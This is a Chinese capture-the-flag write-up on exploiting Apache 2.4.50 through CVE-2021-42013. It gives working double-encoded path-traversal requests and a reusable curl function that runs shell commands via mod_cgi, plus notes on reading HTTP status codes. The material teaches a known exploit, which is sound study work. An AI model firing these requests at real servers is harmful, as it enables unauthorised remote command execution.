## 题解

### 入口与指纹

`Apache/2.4.50 (Unix)`，一个纯静态作品集站点（`index.html` + `styles.css` + `scripts.js` + 两张 jpeg）。

**`2.4.50` 就是全部线索**：

| CVE | 影响版本 | 内容 |
| --- | --- | --- |
| CVE-2021-41773 | 2.4.49 | `.%2e` 路径穿越；配 `mod_cgi` 可 RCE |
| CVE-2021-42013 | 2.4.50 | 上一条补丁不完整，可用 `%%32%65` 二次编码绕过 |

### 关键观察

**1. 一手 `.%2e` 穿越被补丁挡住。**

```bash
curl "$T/.%2e/.%2e/.%2e/.%2e/etc/passwd"      # 400
curl "$T/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"  # 400
```

但**文档根内部**的穿越仍然有效：

```bash
curl "$T/cgi-bin/.%2e/index.html"    # 200，返回站点首页
```

说明 `.%2e` 本身被解析，只是"离开 DocumentRoot"会被拒（400）。

**2. `%%32%65` 就是对 2.4.50 补丁的绕过写法。**

```bash
curl "$T/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"   # 500
```

返回 500 而不是 400/403，说明请求已经**进到了 CGI 处理阶段**（`mod_cgi` 在，且路径被解析成 `/bin/sh` 之类的可执行文件）。

**3. 用 POST 把命令喂给 `/bin/sh`。**

```bash
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'echo Content-Type: text/plain; echo; id' \
  "$T/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
```

```text
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

`mod_cgi` 把请求体当成脚本的 stdin，`/bin/sh` 执行它——**标准 CVE-2021-42013 利用**。

### 利用链

```bash
T=$(head -1 .target)

rce() {
  curl -sS -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-binary "echo Content-Type: text/plain; echo; $1" \
    "http://$T/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
}

rce 'id'            # uid=1(daemon) ...
rce 'ls -la /'      # 根目录里有 FLAG.txt
rce 'cat /FLAG.txt' # flag{67500c26-2de9-4a55-a049-643b8b0c71c4}
```

### flag 位置

容器根目录 `/FLAG.txt`（注意是大写，不是常见的 `/flag`）。

## 复盘

- **版本号就是漏洞编号。** 看到 `Apache/2.4.50` 应该立刻联想到 CVE-2021-41773/42013；
  这类"指纹即答案"的题不需要任何猜测，先按 CVE 试一遍。
- **区分 400 / 403 / 500 的含义。**
  - 400：请求在解析阶段被拒（补丁生效）；
  - 403：路径可达但被访问控制拒绝；
  - **500：请求已经进到处理阶段**（本题就是 CGI 执行出错）。
  看到 500 说明"穿越成功了，只是目标不是普通文件"，这是转向 RCE 的信号。
- **文档根内的穿越常用于验证"解析是否生效"。** `/cgi-bin/.%2e/index.html` 返回 200，
  证明 `.%2e` 被解析；而根外 400 只说明"被限制"，不代表编码无效——这时才需要
  `%%32%65` 的二次编码。
- **`mod_cgi` 的存在把"文件读取"升级成"命令执行"。** 只要 `/cgi-bin/` 可写、
  且能穿越到 `/bin/sh`，POST body 就是 stdin。判据是 `id` 能回显。
- **flag 文件名不一定是 `/flag`。** 本题是 `/FLAG.txt`，所以拿到 RCE 后
  应当先 `ls /` 看一眼，而不是反复 `cat /flag`。
